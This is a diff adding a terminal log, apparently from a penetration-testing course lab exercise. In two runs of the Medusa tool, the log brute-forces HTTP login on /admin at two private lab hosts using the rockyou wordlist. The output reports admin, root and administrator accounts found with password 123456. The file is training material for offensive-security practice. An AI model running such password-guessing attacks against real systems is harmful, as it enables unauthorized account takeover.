@@ -1,0 +1,22 @@
+root@kali:~/Desktop/pwk/pwk/exercises/ex14.2.3# medusa -h 10.11.1.251 -U users.txt -P rockyou.txt -M http -m DIR:/admin -T 10
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+ACCOUNT CHECK: [http] Host: 10.11.1.251 (1 of 1, 0 complete) User: admin (1 of 3, 0 complete) Password: 123456 (1 of 14344391 complete)
+ACCOUNT FOUND: [http] Host: 10.11.1.251 User: admin Password: 123456 [SUCCESS]
+ACCOUNT CHECK: [http] Host: 10.11.1.251 (1 of 1, 0 complete) User: root (2 of 3, 1 complete) Password: 123456 (1 of 14344391 complete)
+ACCOUNT FOUND: [http] Host: 10.11.1.251 User: root Password: 123456 [SUCCESS]
+ACCOUNT CHECK: [http] Host: 10.11.1.251 (1 of 1, 0 complete) User: administrator (3 of 3, 2 complete) Password: 123456 (1 of 14344391 complete)
+ACCOUNT FOUND: [http] Host: 10.11.1.251 User: administrator Password: 123456 [SUCCESS]
+
+
+
+root@kali:~/Desktop/pwk/pwk/exercises/ex14.2.3# medusa -h 10.11.1.234 -U users.txt -P rockyou.txt -M http -m DIR:/admin -T 10
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+ACCOUNT CHECK: [http] Host: 10.11.1.234 (1 of 1, 0 complete) User: admin (1 of 3, 0 complete) Password: 123456 (1 of 14344391 complete)
+ACCOUNT FOUND: [http] Host: 10.11.1.234 User: admin Password: 123456 [SUCCESS]
+ACCOUNT CHECK: [http] Host: 10.11.1.234 (1 of 1, 0 complete) User: root (2 of 3, 1 complete) Password: 123456 (1 of 14344391 complete)
+ACCOUNT FOUND: [http] Host: 10.11.1.234 User: root Password: 123456 [SUCCESS]
+ACCOUNT CHECK: [http] Host: 10.11.1.234 (1 of 1, 0 complete) User: administrator (3 of 3, 2 complete) Password: 123456 (1 of 14344391 complete)
+ACCOUNT FOUND: [http] Host: 10.11.1.234 User: administrator Password: 123456 [SUCCESS]
+
